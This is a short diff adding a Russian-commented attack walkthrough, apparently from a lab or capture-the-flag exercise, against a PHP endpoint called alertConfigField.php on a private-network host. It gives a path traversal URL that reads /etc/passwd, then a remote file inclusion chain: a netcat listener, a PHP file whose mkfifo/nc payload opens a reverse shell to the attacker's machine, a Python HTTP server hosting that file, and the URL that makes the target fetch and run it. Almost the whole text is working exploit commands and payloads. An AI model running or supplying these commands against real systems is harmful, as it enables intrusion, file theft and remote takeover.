@@ -1,0 +1,17 @@
+# Уязвимость заключается в том, что при отсутствии фильтрации на сервере можно загружать всю директорию и получить доступ к каталогу.
+
+http://10.48.181.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+
+# Remote Code Execution через RFI:
+nc -lvnp 4444
+
+# Создаем файл shell.php с кодом для получения обратной оболочки и запускаем простой HTTP-сервер на атакующей машине:
+<?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.187.139 4444 >/tmp/f');
+?>
+
+python3 -m http.server 8000
+
+# Выполняем команду на целевой машине и получаем обратную оболочку:
+http://10.48.181.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.187.139:8000/shell.php
